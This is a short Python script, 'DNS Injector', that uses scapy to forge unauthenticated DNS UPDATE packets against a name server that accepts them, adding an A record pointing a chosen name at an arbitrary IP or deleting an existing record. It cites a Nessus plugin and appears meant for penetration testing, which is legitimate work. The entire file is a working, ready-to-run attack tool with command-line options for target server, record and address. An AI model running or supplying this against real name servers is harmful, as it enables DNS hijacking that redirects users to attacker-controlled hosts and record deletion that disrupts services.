#!/usr/bin/env python
# by Chris Truncer

# Script to attempt to forge a packet that will inject a new value
# for a dns record.  Check nessus plugin #35372
# Some great documentation and sample code came from:
# http://bb.secdev.org/scapy/src/46e0b3e619547631d704c133a0247cf4683c0784/scapy/layers/dns.py


import argparse
import logging
# I know it's bad practice to add code up here, but it's the only way I could
# see to suppress the IPv6 warning from scapy (By setting this
# before importing scapy).
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import os
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1
import sys


def add_a_record(name_server, new_dns_record, ip_value):

    os.system('clear')
    title()

    # Verifying all required options have a populated value
    if name_server is None or new_dns_record is None or ip_value is None:
        print "[*] ERROR: You did not provide all the required command line options!"
        print "[*] ERROR: Please re-run with required options."
        sys.exit()

    print "[*] Crafting packet for record injection..."
    print "[*] Sending DNS packet adding " + new_dns_record
    print "[*] and pointing it to " + ip_value + "\n"

    dns_zone = new_dns_record[new_dns_record.find(".")+1:]

    # Craft the packet with scapy
    add_packet = sr1(IP(dst=name_server)/UDP()/DNS(
        opcode=5,
        qd=[DNSQR(qname=dns_zone, qtype="SOA")],
        ns=[DNSRR(rrname=new_dns_record,
            type="A", ttl=120, rdata=ip_value)]))

    print add_packet[DNS].summary()

    print "\n[*] Packet created and sent!"


def cli_parser():

    # Command line argument parser
    parser = argparse.ArgumentParser(
        add_help=False,
        description="DNSInject is a tool for modifying DNS records on vulnerable servers.")
    parser.add_argument(
        "--add", action='store_true',
        help="Add \"A\" record to the vulnerable name server.")
    parser.add_argument(
        "--delete", action='store_true',
        help="Delete \"A\" record from the vulnerable name server.")
    parser.add_argument(
        "-ns", metavar="ns1.test.com",
        help="Nameserver to execute the specified action.")
    parser.add_argument(
        "-d", metavar="mynewarecord.test.com",
        help="Domain name to create an A record for.")
    parser.add_argument(
        "-ip", metavar="192.168.1.1",
        help="IP Address the new record will point to.")
    parser.add_argument(
        '-h', '-?', '--h', '-help', '--help', action="store_true",
        help=argparse.SUPPRESS)
    args = parser.parse_args()

    if args.h:
        parser.print_help()
        sys.exit()

    return args.add, args.delete, args.ns, args.d, args.ip


def delete_dns_record(del_ns, del_record):

    os.system('clear')
    title()

    # Verifying all required options have a populated value
    if del_ns is None or del_record is None:
        print "[*] ERROR: You did not provide all the required command line options!"
        print "[*] ERROR: Please re-run with required options."
        sys.exit()
    print "[*] Crafting packet for record deletion..."

    print "[*] Sending packet which deletes the following record: "
    print "[*] " + del_record + "\n"

    dns_zone = del_record[del_record.find(".")+1:]

    del_packet = sr1(IP(dst=del_ns)/UDP()/DNS(
        opcode=5,
        qd=[DNSQR(qname=dns_zone, qtype="SOA")],
        ns=[DNSRR(rrname=del_record, type="ALL",
                  rclass="ANY", ttl=0, rdata="")]))

    print del_packet[DNS].summary()

    print "\n[*] Packet created and sent!"


def title():
    print "######################################################################"
    print "#                           DNS Injector                             #"
    print "######################################################################\n"

    return


if __name__ == '__main__':

    # Parse command line arguments
    action_add, action_delete, dns_nameserver, dns_record, dns_ip = cli_parser()

    #Chose function based on action variable value
    try:
        if action_add:
            add_a_record(dns_nameserver, dns_record, dns_ip)

        elif action_delete:
            delete_dns_record(dns_nameserver, dns_record)

        else:
            print "[*] ERROR: You didn't provide a valid action."
            print "[*] ERROR: Restart and provide your desired action!"
            sys.exit()
    except AttributeError:
        os.system('clear')
        title()
        print "[*] ERROR: You didn't provide a valid action."
        print "[*] ERROR: Restart and provide your desired action!"
